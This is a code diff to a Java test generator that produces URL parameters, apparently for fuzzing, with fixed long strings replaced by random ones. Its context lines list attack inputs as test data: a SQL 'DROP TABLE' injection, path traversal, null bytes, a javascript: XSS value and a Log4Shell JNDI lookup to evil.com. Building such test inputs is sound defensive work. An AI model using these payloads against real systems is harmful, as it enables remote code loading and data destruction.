@@ -68,7 +68,8 @@ public class URLParameterGenerator implements TypedGenerator<URLParameter> {
             "'; DROP TABLE users; --",
             "%00",
             "\u0000",
-            "A".repeat(1000),
+            Generators.strings("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", 50, 200).next(),
+            Generators.strings("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", 500, 1000).next(),
             "../../../root",
             "${jndi:ldap://evil.com/}",
             "javascript:alert(1)",
@@ -89,7 +90,8 @@ public class URLParameterGenerator implements TypedGenerator<URLParameter> {
             "param?question",           // Question mark in name
             "param/slash",              // Slash in name
             "param\\backslash",         // Backslash in name
-            "very_long_parameter_" + "name".repeat(100) // Very long name
+            "param_" + Generators.letterStrings(10, 30).next(), // Medium length name
+            "very_long_parameter_name_" + Generators.letterStrings(100, 200).next() // Very long name
     );
 
     private final TypedGenerator<Integer> typeGen = Generators.integers(0, 3);
